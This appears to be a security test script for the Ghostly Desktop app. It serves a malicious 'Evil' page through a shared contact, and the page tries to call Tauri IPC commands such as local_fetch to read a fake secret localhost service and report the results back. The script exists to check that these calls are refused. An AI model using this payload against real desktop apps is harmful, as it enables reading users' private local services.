/**
 * A malicious contact against Ghostly Desktop. Needs a person (or an agent
 * driving the desktop) for the Desktop side:
 *
 *   npm run tauri dev                         # the victim, any profile
 *   node extension/test/desktop-attacks.mjs   # mallory, a Ghostly Browser
 *
 * Mallory prints an invite and shares "Evil". In Desktop, join with the
 * invite and open Evil. Its page tries every Tauri command a viewer window
 * could reach, most of all `local_fetch` against a "secret" service on the
 * victim's machine, and reports back through its own origin.
 */
import { createServer } from "node:http";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const here = dirname(fileURLToPath(import.meta.url));
const work = mkdtempSync(join(tmpdir(), "ghostly-desktop-attacks-"));

// The victim's private local service: nobody should ever read this.
const secretHits = [];
const secret = createServer((req, res) => {
  secretHits.push(req.url);
  res.writeHead(200, { "content-type": "text/plain" });
  res.end("TOP-SECRET-LOCAL-DATA");
});
await new Promise((r) => secret.listen(0, "127.0.0.1", r));
const secretPort = secret.address().port;

const page = `<!doctype html><meta charset="utf-8"><title>Evil</title><h1>Totally harmless</h1><pre id="out"></pre>
<script type="module">
  const ipc = window.__TAURI_INTERNALS__;
  const r = { origin: location.origin, ipc: !!ipc };
  const tryInvoke = async (name, args) => {
    try { r[name] = { ok: true, value: JSON.stringify(await ipc.invoke(name, args)).slice(0, 200) }; }
    catch (e) { r[name] = { ok: false, error: String(e).slice(0, 200) }; }
  };
  if (ipc) {
    await tryInvoke("local_fetch", { url: "http://127.0.0.1:${secretPort}/secret", method: "GET", headers: [], bodyB64: null });
    await tryInvoke("generate_enc_key", {});
    await tryInvoke("get_profile", {});
    await tryInvoke("open_service_window", { peer: "abc", service: "x", title: "pwned" });
    await tryInvoke("service_respond", { id: 1, response: { status: 200, headers: [], bodyB64: "" } });
  }
  document.getElementById("out").textContent = JSON.stringify(r, null, 2);
  await fetch("/report", { method: "POST", body: JSON.stringify(r) });
</script>`;

let report = null;
const evil = createServer((req, res) => {
  if (req.url === "/report") {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      report = JSON.parse(Buffer.concat(chunks).toString());
      res.end("ok");
    });
    return;
  }
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  res.end(page);
});
await new Promise((r) => evil.listen(0, "127.0.0.1", r));

const source = resolve(process.env.EXT_DIR ?? join(here, "..", "dist"));
const extensionDir = join(work, "extension");
cpSync(source, extensionDir, { recursive: true });
const manifestPath = join(extensionDir, "manifest.json");
const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
manifest.host_permissions = manifest.optional_host_permissions;
delete manifest.optional_host_permissions;
writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

const context = await chromium.launchPersistentContext(join(work, "mallory"), {
  channel: "chromium",
  headless: process.env.HEADED !== "1",
  args: [`--disable-extensions-except=${extensionDir}`, `--load-extension=${extensionDir}`, "--disable-features=WebRtcHideLocalIpsWithMdns"],
});
let failed = false;
try {
  const worker = context.serviceWorkers()[0] ?? (await context.waitForEvent("serviceworker"));
  const app = await context.newPage();
  await app.goto(`chrome-extension://${new URL(worker.url()).host}/app.html`);
  await app.getByTitle("New Chat").click();
  await app.getByRole("button", { name: "Create New Chat" }).first().click();
  const invite = (await app.locator("code").first().textContent()).trim();
  await app.getByTestId("add-service").click();
  await app.getByTestId("service-name").fill("Evil");
  await app.getByTestId("service-target").fill(`localhost:${evil.address().port}`);
  await app.getByTestId("service-save").click();
  writeFileSync(join(tmpdir(), "ghostly-desktop-attack-invite.txt"), invite);
  console.log(`INVITE ${invite}`);
  console.log(`Secret service on 127.0.0.1:${secretPort}. Join from Desktop and open "Evil". Waiting up to 15 minutes…`);

  for (const end = Date.now() + 15 * 60_000; !report && Date.now() < end; ) await new Promise((r) => setTimeout(r, 1000));
  if (!report) throw new Error("Desktop never opened Evil");
  console.log("Evil reported:", JSON.stringify(report, null, 2));
  const commands = Object.entries(report).filter(([, v]) => v && typeof v === "object" && "ok" in v);
  const reached = commands.filter(([, v]) => v.ok).map(([k]) => k);
  console.log(`\nViewer origin: ${report.origin}`);
  console.log(reached.length ? `✗ VULNERABLE: the contact's app called ${reached.join(", ")}` : `✓ every Tauri command was refused (${commands.length} tried)`);
  console.log(secretHits.length ? `✗ VULNERABLE: the secret local service was read (${secretHits.join(", ")})` : "✓ the secret local service was never touched");
  failed = reached.length > 0 || secretHits.length > 0;
} catch (error) {
  failed = true;
  console.error("✗", error);
} finally {
  await context.close().catch(() => {});
  evil.close();
  secret.close();
  rmSync(work, { recursive: true, force: true });
  process.exit(failed ? 1 : 0);
}
